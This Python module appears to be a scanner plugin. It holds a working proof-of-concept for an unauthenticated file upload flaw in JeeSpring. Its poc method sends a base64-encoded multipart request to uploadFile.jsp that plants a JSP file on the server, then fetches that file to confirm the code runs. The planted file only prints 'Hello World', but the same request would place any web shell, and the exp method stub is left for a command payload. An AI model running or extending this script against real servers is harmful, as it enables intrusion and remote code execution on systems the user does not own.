# coding:utf-8

import base64
import requests

from util import RandomUA
from util.Translate import tr

class JeeSpring_2023:
    def __init__(self):
        ua = RandomUA.RandomUA()
        self.ua = ua.UserAgent()
        self.headers1 = {
            'User-Agent': self.ua,
            'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apn g,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'zh-CN,zh;q=0.9,ja;q=0.8',
            'Connection': 'close'
        }
        self.payload2 = b'LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnRsbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo='
        self.payload = base64.b64decode(self.payload2)
        self.path = 'static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/'

    def poc(self,url,proxies,ProxyStute):
        if ProxyStute == 1:
            proxies = proxies
        else:
            proxies = None
        try:
            requests.packages.urllib3.disable_warnings()

            re1 = requests.post(url=url + self.path, data=self.payload, headers=self.headers1, verify=False, proxies=proxies)

            code1 = re1.status_code
            if ('jsp' in str(re1.text)) and (int(code1) == 200):
                result1 = tr("v.jee.payload")
                newpath = str(re1.text)
                urltest = url + "static/uploadify/" + newpath.strip()
                retest = requests.get(url=urltest, verify=False, proxies=proxies)
                code2 = retest.status_code
                if ('Hello' in str(retest.text)) and (code2 == 200):
                    result2 = tr("v.jee.found", url=urltest)
                    return result1 + result2
                else:
                    result2 = tr("v.jee.manual", url=urltest)
                    return result1 + result2
            else:
                result = tr("v.jee.none", url=url)
                return result
        except Exception as e:
            error = tr("v.unknown", url=url, e=e)
            return error
    def exp(self,url,proxies,ProxyStute,cmd):
        pass